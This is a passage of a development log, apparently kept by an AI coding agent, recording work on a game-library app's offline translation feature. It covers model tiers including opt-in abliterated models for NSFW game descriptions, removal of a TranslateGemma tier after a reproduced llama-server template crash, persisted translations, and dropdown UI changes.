(only of the non-translation-tuned base Gemma 3 instruct it was fine-tuned from), so this had to
be Qwen-based rather than an uncensored variant of the recommended default.

Picked `qwen3-4b-abliterated` over the 1.5B option - better baseline translation quality matters
more here than squeezing size further, since this is already an opt-in extra a majority of users
will never select. Added as a 4th `TranslationModel` entry, listed last, named explicitly
("Qwen3 4B Abliterated (opt-in, uncensored - for NSFW game descriptions)") rather than folded in
quietly - no separate warning UI built, the name itself in `AppSettings.vue`'s existing radio
list carries the disclosure. Doc comment on `list_models()` records the reasoning (real use
case, not a jailbreak; abliteration's own writeup claims behavior changes specifically on
refusal-triggering prompts, normal-content quality should track the base model closely, but it's
a blunter technique than full safety tuning so it isn't a default) so this doesn't need
re-litigating later. `cargo fmt && cargo check` clean; no frontend changes needed, same as the
prior tier swap.

**Follow-up, same session: added Remove buttons for the downloaded engine/models, plus a
code/milestones.md compaction pass.** First compacted `translation.rs`'s doc comments and
`milestones.md`'s Milestone 20 section - both had accumulated the full multi-round research
history verbatim (mistralrs pivot, tier swaps, abliterated addition), duplicating what this
devlog file already records in detail. Trimmed both down to short pointers back to devlog,
matching `CLAUDE.md`'s own stated split (milestones.md scannable/what's-done, devlog full
why/how) - no behavior change.

User then asked for a way to actually delete a downloaded engine/model from Settings, since
previously `is_translation_engine_downloaded`/`is_translation_model_downloaded` only gated a
plain "Downloaded" status label with no way back. Added `remove_translation_engine` and
`remove_translation_model` Tauri commands - both stop the running `llama-server.exe` subprocess
first if it's the one holding the engine binary or currently-selected-model's GGUF open, since
Windows keeps a running executable's own file locked and the `tokio::fs::remove_dir_all` call
would otherwise fail outright. `remove_translation_model` only kills the server if its
`running.model_id` actually matches the model being removed - removing an unrelated tier while
a different one is actively serving doesn't need to touch the running process at all.

`AppSettings.vue`: the "Downloaded" status spans (engine row and per-tier model rows) became
Remove buttons (`translation.removeEngine()`/`translation.removeModel(model.id)`), reusing the
existing `.compact-button` class rather than a new style. The now-dead `.model-status` CSS rule
and `settings.downloaded` i18n key were removed rather than left behind - the key was fully
unreferenced after the swap (checked via a repo-wide grep before deleting), so keeping it around
across all 10 locale files would've just been clutter. Added `settings.remove` in its place,
propagated to all 9 non-English locales via the same flatten-and-diff Node script used for every
prior i18n addition this session - parity re-verified clean. `cargo fmt && cargo check` and
`bun run build` both clean.

**Follow-up, same session: toasts for the translation feature's full lifecycle.** Engine
install/removal, model install/removal, and translation completion all toast inline in
`stores/translation.ts`'s existing actions (`useToastStore().push(...)`, same plain-English-
string convention every other store's toasts already use - this app doesn't route toast copy
through vue-i18n). Model loading/unloading needed real backend events instead, since both can
happen with no frontend call in flight to hang a toast off of - specifically the idle-timeout
auto-shutdown (`watch_idle`, purely a background task) and a model-switch's kill of the
previous server (inside `ensure_server`, before the new one spawns). Added a
`TranslationModelEvent { model_id }` payload and two new emits in `translation.rs`:
`translation-model-loading` (right before `ensure_server` spawns a fresh `llama-server.exe`)
and `translation-model-unloaded` (both from the switch-kill branch and from `watch_idle`'s idle
kill - deliberately not from `shutdown()` on app exit, since there's no UI left to show a toast
to by then, and not from the two `remove_translation_*` commands either, to avoid stacking an
"unloaded" toast on top of the "removed" one for the same action). Frontend listens for both in
`stores/translation.ts`'s `init()`, looking up the model's display name via a small `modelName()`
helper before toasting. `cargo fmt && cargo check` and `bun run build` both clean.

**Follow-up, same session: fixed real slow-translation reports on `qwen3-4b`.** User reported
translation taking noticeably longer than expected on that tier specifically. Root cause,
confirmed via research rather than guessed: Qwen3's whole line are hybrid "thinking" models,
defaulting to emitting a full `<think>...</think>` reasoning block before the actual answer -
real, unwanted latency for a task as simple as translating a short description, not a raw
inference-speed problem. Fix is llama.cpp's own documented per-request override,
`chat_template_kwargs: {"enable_thinking": false}` in the `/v1/chat/completions` body (no server
restart needed) - added a `ChatTemplateKwargs` struct to `translate_text`'s `ChatRequest`,
always sent regardless of which tier is selected. Safe to always include: `translategemma-4b`/
`qwen2.5-1.5b`'s chat templates don't reference this variable at all, so it renders as an
unused Jinja context key with no effect, same as passing an extra unused kwarg anywhere else.
`cargo fmt && cargo check` clean.

**Follow-up, same session: closed the "persist translated description" deferred item, extended
to cover title too.** User asked for translated title/description to actually persist to the DB
(previously explicitly deferred, client-side-only, never surviving a page navigation) and for
the title to get the same treatment.

Added migration v4 (`db.rs`) - `translated_title`/`translated_description`/`translated_locale`
columns on `games`, all nullable, additive-only per this project's post-baseline migration
convention. Kept alongside the originals rather than replacing them, same "never overwrite the
source" principle the original client-side-only design already established - just backed by the
DB now instead of a component-local ref. `translated_locale` records which UI locale a cached
translation was actually made *for*; comparing it against the current UI locale is how a stale
translation gets detected without needing a separate boolean flag or an engine round-trip just
to find out.

`games.ts`'s `update()` (the general edit-save path) now unconditionally clears all three
translated_* columns on every save, rather than checking whether title/description specifically
changed - simplest way to guarantee a stale translation (translated from wording that's since
been edited) can never survive an edit. New `updateTranslation()` method writes the cached
translation; `stores/library.ts` gained a thin `saveTranslation()` wrapping it plus the existing
`refresh()` call, mirroring `saveEdit()`'s own shape exactly.

`GameDetail.vue`'s translation state changed from a single ephemeral `translatedDescription` ref
to `showTranslated` (a pure view toggle over already-persisted data, doesn't itself call the
engine) plus a `hasValidTranslation` computed (`translated_description` present and
`translated_locale` matches the current UI locale). `onToggleTranslate` now branches three ways:
a valid cached translation just flips the view toggle instantly (no engine call); no valid
translation calls `translation.translate()` **twice** (title, then description - the store's
`translate()` API takes one string at a time, and each call already toasts its own "Translation
complete." per the earlier toast work, so translating both fields does produce two success
toasts per action - accepted as a minor, harmless redundancy rather than special-cased away).
Button label gained a third state (`showTranslated` i18n key, propagated to all 10 locales,
parity re-verified) for "valid translation exists but currently showing the original" -
previously there were only two states since nothing persisted long enough to need one.

`cargo fmt && cargo check` and `bun run build` both clean. `vue-tsc`'s pass confirms no other
code constructs a `Game` object manually (a repo-wide grep for `Game` literals also came back
empty) - the 3 new required-but-nullable fields only ever come from a real DB row via `SELECT
*`, so no other call site needed touching.

**Follow-up: split each model's `name`'s "(...)" qualifier into a dedicated `subtitle` field.**
User asked for the parenthetical part of each tier's display name (e.g. "TranslateGemma 4B
(recommended, translation-specialized)") to render as a visual subtitle instead of packed inline
- added `subtitle: String` to `TranslationModel` (both the Rust struct and the frontend
`TranslationModel` interface) rather than having the frontend regex-parse it back out of a
parenthesized string, which would've been fragile the moment a name/qualifier contained its own
parens. `AppSettings.vue`'s per-tier row wraps name+subtitle in a new `.model-info` column
(flex:1, so it still fills the same horizontal space the old flat `.model-name` did); the
engine-download row (which has no subtitle) keeps using the older plain `.model-name` span
directly, so `.model-name`'s own `flex: 1` rule had to stay in place for that row alongside the
new `.model-info` wrapper for the model list. `bun run build` clean.

**Follow-up: pinned `llama-server.exe`'s thread count, then found and fixed the real cause of
translategemma-4b silently producing no translation.** User reported `qwen3-4b` translation
taking longer than expected; researched llama-server's own thread defaults and initially
proposed explicit `-t`/`-tb` flags as the fix. Verified against the actual bundled binary's own
`--help` output (still had it extracted from earlier verification work) before committing to
that claim - `--threads` already defaults to `-1`, which is llama.cpp's own auto-detect, not
single-threaded - so explicitly pinning `-t`/`-tb` to `std::thread::available_parallelism()` is
a safe defensive tweak, not the fix it was first assumed to be. Corrected this directly to the
user rather than letting an overstated claim stand: the real, unavoidable cause of slow
translation is CPU-only 4B-class inference's inherent ~8-15 tok/s ceiling on typical consumer
hardware - an accepted cost of the "no GPU dependency, no heavy Rust ML crate" design already
chosen for this engine, not something more thread-tuning fixes.

User then reported `translategemma-4b` specifically failing to translate at all - no error
toast, no console error, just nothing happening. Researched TranslateGemma's actual expected
request format rather than assuming it was a generic instruct model like the Qwen tiers, and
found the real bug: TranslateGemma's own chat template requires `content` as a structured
one-element array (`[{type: "text", source_lang_code, target_lang_code, text}]`), not a plain
string - and its template throws `UndefinedError` if `source_lang_code` is missing, with no
"auto-detect" option. This app was sending the same plain-string, freeform-instruction prompt to
every model regardless of tier. Worse, llama-server only actually renders a GGUF's own embedded
Jinja chat template when started with `--jinja` - without it, TranslateGemma's real template
likely never ran at all, falling back to some generic formatter that produced empty/garbage
output silently instead of erroring, which explains why nothing appeared and nothing logged.

Fixed properly rather than papering over: added the `--jinja` server flag (harmless for the
Qwen tiers, whose templates are plain-string-based and unaffected either way - and arguably more
correct for them too, now actually using their own real templates instead of a fallback).
`ChatMessage.content` changed from `String` to a new `#[serde(untagged)] enum ChatContent {
Text(String), Parts([TranslateGemmaPart; 1]) }`, letting `translate_text` branch on
`model_id.starts_with("translategemma")` and build the correct shape per model rather than
forcing one generic request format on every template. Added `translategemma_lang_code()` to map
this app's own locale codes to what TranslateGemma's template accepts - turned out to be a
no-op today (`zh-Hans`/`pt-BR` are already real TranslateGemma-supported codes, verified via
research rather than assumed), but kept as its own named function since it's the one place a
future locale/code mismatch would need fixing.

`source_lang_code` has no auto-detect option in TranslateGemma's template at all and this app
has no source-language detection built, so it's hardcoded to `"en"` - a real, documented
limitation: translating an originally non-English description via `translategemma-4b`
specifically will produce a wrong translation, since the app has no way to know otherwise. Game
metadata in this app comes overwhelmingly from English-language sources (Steam/IGDB/GOG/Epic
APIs), making this the pragmatic default rather than blocking the fix on building source-language
detection, which nothing asked for. The Qwen tiers have no such requirement at all, since their
plain freeform prompt doesn't need to know the source language to translate correctly.
`cargo fmt && cargo check` clean.

**Follow-up: added `max_tokens` cap, then found and fixed the real reason `translategemma-4b`
specifically kept "taking too long."** First added `max_tokens: 1024` to `ChatRequest` as a
defensive cap - no limit existed at all, meaning a model failing to emit a clean stop token
could ramble out to the full 4096-token context before stopping, which at CPU-only generation
speed is minutes, not seconds, and would read to a user as "translation is slow" rather than the
actual bug (unbounded generation).

User reported this didn't actually fix it, and gave the key diagnostic detail unprompted:
`qwen3-4b` translates fine, only `translategemma-4b` is slow, and specifically on cold start
(first translate after the model's been unloaded). Since `qwen3-4b`'s own GGUF is almost
exactly the same file size as `translategemma-4b`'s (2.5GB vs 2.49GB), a generic "cold start
means reading a multi-gigabyte file off disk" explanation didn't fit - if that were the whole
story, both tiers would be equally slow to cold-start, not just one. This model-specific
difference pointed at something in translategemma's own generation behavior, not disk I/O.

Researched and found a real, documented bug class affecting exactly this situation: Gemma3-
family GGUF conversions (translategemma is a Gemma 3 fine-tune) commonly write `<end_of_turn>`
into the GGUF's tokenizer metadata as a NORMAL token instead of CONTROL (multiple open issues on
both `ggml-org/llama.cpp` and `unslothai/unsloth`'s trackers describe this exact failure mode) -
llama.cpp only recognizes CONTROL-flagged tokens as stop signals, so a NORMAL-tagged
`<end_of_turn>` is invisible to it as a stop condition. Concretely: the model *does* finish its
actual translation and then correctly try to end the turn, but llama.cpp doesn't recognize that
signal and keeps generating past it - explaining why this was newly capped at `max_tokens=1024`
by the previous fix rather than continuing indefinitely, and why it "still takes too long" even
with that cap in place (1024 tokens of pure waste, generated at CPU speed, on every single
translation). Also found a second, related open issue (`ggml-org/llama.cpp#20305`) describing
Jinja template-parsing changes that specifically broke TranslateGemma's own structured template
in some more recent llama.cpp builds - not confirmed as affecting this project's exact pinned
`b10290` release, but consistent with this being a known-fragile area for this specific model
family under `--jinja`, not a one-off bug in this app's own code.

Fixed via the standard, documented workaround for this exact bug class: added a `stop: Vec<
&'static str>` field to `ChatRequest`, set to `["<end_of_turn>"]` only when `is_translategemma`
(empty for the Qwen tiers, which aren't affected by this bug and already stop cleanly on their
own). llama-server matches stop sequences against raw decoded output text in addition to
tokenizer-level stop-token recognition, so this works regardless of whether the GGUF's own
metadata has the NORMAL/CONTROL tagging bug or not - a safe fix that doesn't depend on getting
translategemma-4b's specific GGUF re-converted correctly upstream. `cargo fmt && cargo check`
clean. Real end-to-end confirmation that this actually resolves the slowness (not just addresses
a plausible-sounding cause) still needs the user's own machine.

**Follow-up, same session: the stop-sequence fix didn't help either - stopped guessing and
empirically tested the real failure instead of proposing another plausible-sounding fix.** User
reported no improvement, then volunteered the key diagnostic detail unprompted: `qwen3-4b`
works fine, only `translategemma-4b` is slow, and specifically on cold start. Since `qwen3-4b`'s
own GGUF is almost exactly the same file size as `translategemma-4b`'s (2.5GB vs 2.49GB), a
generic "cold start = slow disk read" explanation didn't fit - if that were the whole story,
both tiers would cold-start equally slowly. This model-specific asymmetry pointed at something
in translategemma's own generation/template behavior, not disk I/O, and ruled out the disk-read
theory directly rather than restating it.

Given three consecutive fix attempts (structured content format, `--jinja`, explicit stop
sequence) hadn't resolved it, asked the user directly whether to (a) try a different GGUF
quantizer as a diagnostic, or (b) drop `translategemma-4b` outright in favor of the already-
working `qwen3-4b`. User picked (a) - genuinely test a different source rather than guess again.

**Ran a real empirical test instead of continuing to reason from documentation alone.** Fetched
`bullerwins/translategemma-4b-it-GGUF`'s real Q4_K_M file size via the HF API (2.49GB, matching
`mradermacher`'s), and separately pulled that same API's `gguf` metadata field directly -
revealing `eos_token: "<eos>"` while the actual chat template only ever emits `<end_of_turn>` to
end a turn, never `<eos>`, during normal single-turn chat. This is a genuine, well-known
structural quirk of the whole Gemma chat-template family (not specific to any one GGUF
conversion) - llama.cpp's built-in EOS-based auto-stop, driven by the GGUF's declared
`eos_token`, would never fire during a single chat turn, which is exactly why the earlier
`stop: ["<end_of_turn>"]` fix should have been the right lever. That it apparently wasn't enough
meant something deeper was wrong, worth confirming directly rather than layering on a fourth
guess.

Downloaded `bullerwins/translategemma-4b-it-GGUF`'s real Q4_K_M file (2,489,909,312 bytes,
verified against the exact expected size, redone once after a first attempt truncated at 596MB -
`curl -C -` resume against a source that doesn't support byte-range resume cleanly produced a
corrupted 2.75GB file; discarded and re-downloaded from scratch rather than trusting a resumed
partial). Started the actual bundled `llama-server.exe` (the same binary this app downloads,
already extracted from earlier verification work) with the exact flags `ensure_server` uses
(`-m ... --port 8712 -c 4096 -t 16 -tb 16 --jinja`) and captured its own log output directly
rather than going through the app.

**Real result: the server crashes at model-load time, before any request is even sent.**
```
chat template parsing error: Unable to generate parser for this template. Automatic parser
generation failed:
Error: Jinja Exception: User role must provide `content` as an iterable with exactly one item.
That item must be a `mapping(type:'text' | 'image', source_lang_code:string,
target_lang_code:string, text:string | none, image:string | none)`.
please consider disabling jinja via --no-jinja, or use a custom chat template via --chat-template
exiting due to model loading error
```
llama-server's static template-parser (minja) can't prove the template's own `raise_exception`
guard is unreachable, and refuses to even start the server with `--jinja` set - a genuine,
currently-open llama.cpp limitation for this specific template's structure (matches
`ggml-org/llama.cpp#20305`, "Jinja Template Parsing Error in TranslateGemma," and a HF
discussion titled "After llama.cpp rework of template parsing, can no longer load this model").
Downloaded and re-ran the identical test against `mradermacher/translategemma-4b-it-GGUF`'s own
Q4_K_M (the exact file this app's real production code uses, not just a plausible substitute) -
**identical crash, byte-for-byte the same error**, confirming this isn't specific to either
quantizer's conversion - it's the model's own template structure against this exact llama.cpp
build, full stop.

This also explains every "still takes too long" report retroactively: `ensure_server` spawns
the child successfully (the OS call itself doesn't fail), but nothing checks whether the child
process exits early on its own - `wait_until_ready` just keeps polling `/health` against an
already-dead process for the full 60-second timeout before finally returning an error. Every
translategemma-4b attempt since `--jinja` was added was silently burning a guaranteed ~60 seconds
before failing, not translating slowly - the eventual error toast likely auto-dismissed before
being read carefully, reading as "it's just slow" rather than "it's failing every time."

**Removed `translategemma-4b` entirely rather than continuing to patch around a confirmed
upstream bug.** `list_models()` drops it; `qwen3-4b` promoted to the recommended default tier
(3 tiers total now, not 4). Reverted all translategemma-specific request-building code added in
the previous two fix attempts: `ChatContent`'s `Text`/`Parts` enum collapsed back to a plain
`String` on `ChatMessage.content`, `TranslateGemmaPart`/`TRANSLATEGEMMA_SOURCE_LANG`/
`translategemma_lang_code()` deleted, the `stop` field removed from `ChatRequest` (no remaining
tier needs it). Also removed `--jinja` from the server launch args - its only justification was
TranslateGemma's structured template; keeping it for the Qwen tiers would be introducing
unverified risk to an already-working path for no benefit, so reverted rather than left in on a
"probably fine" assumption. `enable_thinking`/`max_tokens` both kept - genuinely useful
regardless of tier lineup. `cargo fmt && cargo check` and `bun run build` both clean; a
repo-wide grep confirms no other file references `translategemma`/`TranslateGemma` anymore.
Test artifacts (the ~5GB of downloaded GGUFs, server logs) cleaned up from the job's scratch
directory afterward, not left behind.

**Follow-up, same session: user pushed back with real-world evidence, leading to `gemma4-e2b`
being added.** User pointed out Ollama - which is also llama.cpp-backed - runs Gemma 4 fluently
on their own machine, and asked for a direct test without `--jinja` for the Gemma line, rather
than accepting "Gemma templates are broken in llama.cpp" as a blanket conclusion from the
TranslateGemma crash alone. Fair challenge, worth checking empirically rather than assuming
Ollama's success (which very plausibly goes through its own Go-based templating layer, not
llama-server's `--jinja`/minja path at all) somehow contradicted the crash already found.

Downloaded `unsloth/gemma-4-E2B-it-GGUF`'s real Q4_K_M (3,106,738,272 bytes, verified against
HF's own tree listing before downloading) and started the bundled `llama-server.exe` **without**
`--jinja` this time - `/health` came back ready with no crash. Sent a real translation request
through it (the exact JSON shape `translate_text` builds - system-free instruction prompt,
`enable_thinking: false`, `max_tokens: 1024`) and got back a correct, clean Korean translation:
`finish_reason: "stop"` (no rambling), 41 completion tokens, 4.1s round trip, ~11.5 tok/s -
matching the expected CPU-only throughput range from earlier research, and confirming this
isn't just "loads without crashing" but actually produces a real, sensible answer end-to-end.

This resolves the apparent contradiction rather than leaving it unexplained: the crash found
earlier was specifically about forcing `--jinja`'s strict static Jinja parser (minja) onto
templates too structurally complex for it to prove safe ahead of time - both Gemma 4's own
official template (independently confirmed via separate research: llama.cpp "cannot handle
Gemma-4's complex Jinja template with macros, namespaces, and dictsort," bypassing it with
hardcoded C++ workarounds instead) and TranslateGemma's structured-content template hit this
same class of limitation. Without `--jinja` (already removed entirely in the previous fix),
llama.cpp falls back to its own hardcoded per-architecture chat formatting instead of the broken
parser path - which works fine for a standard chat model like Gemma 4, since it doesn't need
the parser to correctly reason about a conditional `raise_exception` guard the way
TranslateGemma's translation-specific template does. TranslateGemma still has no working path
either way, since its correctness genuinely depends on structured input only the real (crash-
prone) Jinja template provides - this is a real, asymmetric difference between the two model
families' template complexity, not evidence the first test was wrong.

Directly acknowledged to the user, when asked, that the *original* "TranslateGemma silently
fails without `--jinja`" claim was never independently re-tested by this session the way the
crash-with-`--jinja` claim was - it rests on the user's own real first bug report (from before
`--jinja` existed in this codebase at all) plus research into the template's structural
requirements, not a direct empirical test run here. Worth being explicit about that distinction
rather than letting "confirmed via testing" quietly cover a claim that was actually inference -
the same discipline this whole investigation has otherwise tried to hold to.

Added `gemma4-e2b` as a 4th tier (~3.1GB, `unsloth/gemma-4-E2B-it-GGUF`, real verified size) -
general-purpose, no special-casing needed in `translate_text` since it uses the same plain-
string content format as the Qwen tiers. `list_models()`'s doc comment updated to record both
the `--jinja` crash class and this confirmed-working exception in the same place, so a future
pass has both halves of the story rather than just "Gemma is broken." `cargo fmt && cargo check`
and `bun run build` both clean; test GGUF and logs cleaned up from the job's scratch directory
afterward.

**Follow-up, same session: redesigned the translate control as a dropdown, splitting title and
content into fully independent translate/view actions.** User asked for the single "Translate"
button to become a dropdown with 5 items - translate title only, translate content only, and 3
independent view toggles (title, content, both) - with the trigger button always reading
"Translate" regardless of state, since re-translating with a different selected model and
overwriting the cached translation is now a deliberate, repeatable action rather than a one-shot
toggle.

This meant splitting what was previously one shared `showTranslated`/`hasValidTranslation` pair
into two fully independent pairs (`showTranslatedTitle`/`hasValidTranslatedTitle` and
`showTranslatedDescription`/`hasValidTranslatedDescription`) - translating title and content are
now two separate actions (`onTranslateTitleOnly`/`onTranslateContentOnly`), each calling
`translation.translate()` once and persisting through its own store action rather than the
previous single combined `saveTranslation`. Both `games.ts`'s `updateTranslation` and
`library.ts`'s `saveTranslation` split into `updateTranslatedTitle`/`updateTranslatedDescription`
pairs, each writing only its own field (plus the shared `translated_locale` column) - translating
one field never touches the other's already-cached value now, whereas the old combined method
would have required threading the untouched field's existing value through by hand to avoid
clobbering it.

Known, accepted edge case carried over from a single shared `translated_locale` column: since
both fields share one locale marker, translating title under one active UI locale and content
under a different one (i.e. switching languages between the two actions) means the *older* of
the two would incorrectly read as still-valid once the newer overwrites the shared column - not
tracked separately, on the same "real edge case, rare in practice, not worth a second migration
for" reasoning already used for `translategemma-4b`'s hardcoded English source-language
assumption earlier this milestone.

The dropdown itself: no prior dropdown/menu component existed anywhere in this codebase to
reuse, so built minimally rather than reaching for a library or inventing a reusable composable
for a single use site - a `translateMenuOpen` ref, an absolutely-positioned `.translate-menu`
under the trigger button, and a full-viewport invisible `.translate-menu-backdrop` (lower
z-index than the menu) that closes the menu on any outside click - avoids a `window`-level
`mousedown` listener plus its own mount/unmount lifecycle wiring for what a plain backdrop div
already handles declaratively. Each of the 5 items is its own `<button>`, disabled individually
based on what's actually possible right now (content-related items disabled with no
description; each view-toggle disabled with no valid cached translation for that field; the
combined toggle disabled only if *neither* field has one).

Also moved the translate control out from under the old `v-if="game.description"` gating
entirely - title translation is now meaningful even for a game with no description at all, so
the dropdown trigger is gated only on `canTranslate` (engine + selected model both downloaded),
while the description text block keeps its own `v-if="game.description"` separately.

8 old i18n keys removed (`translating`/`showOriginal`/`showTranslated` - confirmed unreferenced
via grep before deleting) and 8 new ones added (`translateTitleOnly`/`translateContentOnly`/
`showOriginalTitle`/`showTranslatedTitle`/`showOriginalContent`/`showTranslatedContent`/
`showOriginalBoth`/`showTranslatedBoth`), propagated to all 9 non-English locales via the same
flatten-and-diff Node script used throughout this project - parity re-verified clean.
`bun run build` clean; no Rust changes this pass.

**Follow-up, same session: added a "Translate Title and Content" combined action with a visible
"Translating..." state, revoke actions per field, per-field skeletons during translation, and
propagated translated titles to every other place a game's name appears.** Four related asks in
one pass.

**Combined translate + visible progress.** `onTranslateTitleAndContent` runs both translate
calls sequentially (title first, then content only if a description exists), each in its own
try/finally so a title-translation failure aborts before ever starting content (matches the
existing per-field error-toast behavior, doesn't partially succeed silently). The trigger
button's label is dynamic again (`"Translating..."` while in flight, `"Translate"` otherwise) -
a partial reversal of the earlier "button always reads Translate" decision, since the user
specifically wanted visible wait-feedback this time; re-added the `translating`/`gameDetail.
translating` key that had just been removed the previous pass, this time as a computed
derived from two new granular refs rather than one shared boolean (see below).

**Per-field skeletons.** `translating` split into `translatingTitle`/`translatingContent` refs
(a `computed` `translating = translatingTitle || translatingContent` still covers the trigger
button's own label/disabled state, since only one translation realistically runs at a time
anyway). Title and description each reuse the existing `.skeleton-title`/`.skeleton-desc`
classes already established for the `textPending` (image-brightness-resolving) case elsewhere
in this same file - translating content only doesn't blank the already-settled title, and vice
versa, matching the same "only show a skeleton for what's actually loading" principle.

**Revoke actions.** Three new dropdown items clear a cached translation back out entirely
(`games.ts`'s `clearTranslatedTitle`/`clearTranslatedDescription`/`clearTranslation`, each only
touching their own field(s) - the per-field ones deliberately leave `translated_locale` alone,
since the *other* field's cached translation may still depend on it being correct). Gated on raw
presence (`hasCachedTitle`/`hasCachedDescription`, a plain `!!game.translated_title` check) not
current-locale validity, unlike the view-toggle items - the whole point of revoke is clearing
out a translation even if it's already stale/wrong-locale, not just hiding a valid one. A thin
`.translate-menu-divider` separates the revoke group from the translate/view-toggle groups above
it in the dropdown, since 9 items in one flat list needed at least one visual grouping cue.

**Translated titles everywhere else a game is named.** Added `displayTitle(game, locale)` as a
small pure function in `src/db/types.ts` (co-located with the `Game` type it reads, re-exported
from `db/index.ts`'s barrel) rather than duplicating the same locale/validity check in three
separate components - `game.translated_title && game.translated_locale === locale ? ... :
game.title`. This is deliberately simpler than `GameDetail.vue`'s own `hasValidTranslatedTitle`/
`showTranslatedTitle` pair, since there's no per-view toggle concept anywhere except the detail
page itself - everywhere else just always prefers a valid cached translation with no way to
opt back to the original inline (the user can still revoke it entirely from the detail page if
they want the original back). Wired into `GameCard.vue`'s hover balloon (`balloon-title`),
`GameListRow.vue`'s `.title`, and both of `StatsPanel.vue`'s game lists (Most Played, Recently
Played) - each pulls `appSettings.locale` from the already-established `useAppSettingsStore`.
Deliberately left untouched: `GameCard`/`BigPictureTile`'s cover-placeholder initial letter and
image `alt` text (always the original title's first character/full text - not requested, and a
translated title changing a tile's fallback initial felt like a separate design question), and
`GameListRow`'s plain-text description preview (translation only ever applies to title here,
matching exactly what was asked).

8 new i18n keys added (`translateTitleAndContent`, `revokeTitleOnly`/`revokeContentOnly`/
`revokeBoth`, plus re-adding `translating`) - propagated to all 9 non-English locales via the
same flatten-and-diff Node script used throughout this project, parity re-verified clean.
`bun run build` clean.

**Follow-up, same session: trigger button always visible; translate actions hidden (not the
whole menu) when no usable model is set up; second divider added.** The dropdown wrapper's
`v-if="canTranslate"` was gating the entire button - meaning a game with an already-cached
translation (from before the user uninstalled the engine/model, or before switching to a
different tier) had no way to view or revoke it once `canTranslate` went false. Moved that
condition down: the trigger button and dropdown now always render; only the 3 translate-action
items (title/content/both) are wrapped in their own `v-if="canTranslate"`, followed by a
`.translate-menu-divider` that appears only alongside them - the show/revoke groups (and the
divider between those two) stay available regardless, since viewing or clearing an already-
cached translation never needs the engine to be ready. `bun run build` clean.

**Follow-up, same session: redesigned the 9-item flat dropdown into a 3-group paged carousel.**
User reported 9 items across 2 dividers was too much for one dropdown, and specified a concrete
design instead: show one group (translate/show/remove) at a time, page between groups via mouse
wheel or ArrowUp/ArrowDown while the menu is open, animated, with a 3-dot indicator below the
items showing which group is active.

Replaced both `.translate-menu-divider`s with actual paging state: a `TranslateMenuGroup` union
type (`"translate" | "show" | "remove"`), a `translateMenuGroups` computed that's `["show",
"remove"]` when `!canTranslate` (skips the translate group entirely rather than showing it with
every item disabled - matches the previous pass's "translate actions hidden, not the whole menu"
intent, just applied to a whole group now instead of 3 individual items) and `["translate",
"show", "remove"]` otherwise, and a plain `translateMenuGroupIndex` ref clamped (not wrapped) at
both ends by `nextTranslateMenuGroup`/`prevTranslateMenuGroup`.

Wheel and keyboard both drive the same two functions: `onTranslateMenuWheel` (`deltaY > 0`
advances, `< 0` goes back, `preventDefault()`s so the page itself doesn't scroll behind
the open menu) and `onTranslateMenuKeydown` (`ArrowDown`/`ArrowUp`, also `preventDefault()`s).
The menu div itself is the keydown target (`tabindex="-1"`, `menuEl.focus()` called right after
opening via `nextTick` so the DOM has actually rendered first) rather than a global `window`
keydown listener - same reasoning as the earlier backdrop-click-to-close choice: avoids adding
mount/unmount lifecycle wiring for a control that's only ever open briefly.

Animation: each group's 3 buttons live inside a single `<div class="translate-menu-group">`,
keyed by the current group name and wrapped in `<Transition name="menu-group" mode="out-in">` -
a small vertical slide+fade (6px, 0.15s) plays whichever direction was actually paged. Chose a
single non-directional transition (always slides the same way) rather than reversing it for
ArrowUp vs ArrowDown - the dot indicator is what actually communicates position/direction to the
user; a second axis of "which way did the animation come from" would be complexity for its own
sake here, not requested and not obviously clearer. The 3-dot row (`.translate-menu-dots`,
below the item list, one `.translate-menu-dot` per entry in `translateMenuGroups` so it's 2 dots
when the translate group is hidden) highlights the active index via a background-color/scale
transition, not click-to-jump (only passive position feedback was asked for).

`cargo`/Rust untouched this pass. `bun run build` clean.

**Follow-up, same session: persisted the "show" toggle's state per game.** Previously
`showTranslatedTitle`/`showTranslatedDescription` were pure component-local refs, always
starting from the original on every reopen of a game's detail page - user asked for the last
chosen "show" option to be remembered per game (e.g. "see translated title" stays chosen for
that specific game next time, without affecting any other game's own toggle state).

Added migration v5 - `show_translated_title`/`show_translated_description`, both `INTEGER NOT
NULL DEFAULT 0` (SQLite booleans, same convention as `skip_dedup`) on `games`, additive-only per
this project's post-1.0 migration rule. `games.ts` gained `updateShowTranslated(id, showTitle,
showDescription)` - both flags written together in one call rather than two separate setters,
since every toggle handler already knows both current values after any state change (a
title-only toggle still knows the description's current show state unchanged, etc.) -
`library.ts`'s `setShowTranslated` wraps it with the usual `refresh()`.

`GameDetail.vue`'s `watch(game, ...)` changed from unconditionally resetting both refs to `false`
into syncing them from the newly-viewed game's own persisted columns (`{ immediate: true }` so
this also runs on first mount, not just on subsequent navigation) - this one watcher now
correctly covers both "switched to a different game" (picks up that game's own saved choice) and
"our own action just refreshed this same game" (re-syncs to what was just persisted,
idempotent). A new `persistShowTranslated()` helper calls `library.setShowTranslated` with the
current local ref values; called after every place either ref changes - all 3 translate actions
(after setting the just-translated field's show flag to `true`), all 3 view-toggle handlers, and
all 3 revoke actions (after resetting the revoked field's flag to `false`) - so the DB and the
local view state never drift apart no matter which of the 9 dropdown actions triggered the
change. `games.ts`'s `update()` (the edit-save path) also resets both flags to `0` alongside the
`translated_*` columns it already nulls on every edit - there's nothing left to show translated
once an edit clears the cache, so leaving a stale `show_translated_title = 1` behind would be
pointless dangling state, not a correctness bug (display already falls back to the original
regardless, gated by `hasValidTranslatedTitle`) but worth cleaning up for the same reason the
`translated_*` columns get cleared unconditionally rather than conditionally.

`cargo fmt && cargo check` and `bun run build` both clean.

## Milestone 20 — Internationalization & Offline Translation — post-close addition

**Added `gemma4-e2b-abliterated` as a 5th tier.** User asked for an uncensored Gemma 4 variant
alongside the existing `qwen3-4b-abliterated` one, for the same reason - translating an existing
NSFW game's own store description without a safety-tuned model refusing. Found a real GGUF via
`mradermacher` (the same quantizer already used elsewhere in this lineup) -
`gemma-4-E2B-it-abliterated-GGUF`, Q4_K_M verified at 3,427,874,208 bytes via the HF tree API
directly (not estimated) - somewhat heavier than the base `gemma4-e2b` (3.11GB) despite being
the same underlying model, likely down to a different quantization/imatrix pass on the
abliterated weights, not a discrepancy worth chasing further. No `--jinja`/template special-
casing needed - abliteration only touches weights, not the tokenizer/chat template, so it
behaves identically to `gemma4-e2b` in `translate_text` (plain string content, already the
default now that `translategemma-4b` and its structured-content branch are gone). `cargo fmt &&
cargo check` clean; no frontend changes needed since `AppSettings.vue`/`GameDetail.vue` both
read the tier list dynamically.

